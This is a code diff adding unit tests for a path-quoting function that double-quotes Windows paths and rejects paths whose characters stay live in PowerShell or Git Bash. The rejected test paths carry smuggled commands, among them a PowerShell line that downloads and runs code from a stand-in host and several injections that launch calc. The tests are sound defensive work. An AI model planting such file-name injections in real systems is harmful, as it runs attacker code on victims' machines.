@@ -39,6 +39,32 @@ describe('shellEscapePath', () => {
     )
   })
 
+  it('keeps double-quoting Windows paths whose $, ! and parentheses stay literal', () => {
+    expect(shellEscapePath('C:\\Users\\orca\\download (1).png', 'windows')).toBe(
+      '"C:\\Users\\orca\\download (1).png"'
+    )
+    expect(shellEscapePath('\\\\host\\C$\\share\\a b.txt', 'windows')).toBe(
+      '"\\\\host\\C$\\share\\a b.txt"'
+    )
+    expect(shellEscapePath('C:\\Users\\orca\\Hello! World.txt', 'windows')).toBe(
+      '"C:\\Users\\orca\\Hello! World.txt"'
+    )
+    expect(shellEscapePath('C:\\Users\\orca\\done!', 'windows')).toBe('"C:\\Users\\orca\\done!"')
+  })
+
+  it.each([
+    'C:\\repo\\notes $(iex (iwr evil.example).Content).txt',
+    'C:\\repo\\a ${x:-y}.txt',
+    'C:\\repo\\a $[1+1].txt',
+    'C:\\repo\\a `calc`.txt',
+    'C:\\repo\\a!#;calc;#.txt',
+    'C:\\repo\\a\u201D; calc; \u201Cb.txt',
+    'C:\\repo\\a\u201E.txt',
+    'C:\\repo\\a" & calc & ".txt'
+  ])('refuses Windows path %s that double quotes leave live in PowerShell or Git Bash', (path) => {
+    expect(shellEscapePath(path, 'windows')).toBeNull()
+  })
+
   it('uses POSIX escaping for SSH drops regardless of client OS', () => {
     // A Windows client dropping into a Linux SSH worktree must produce POSIX
     // quoting, not Windows double-quotes.
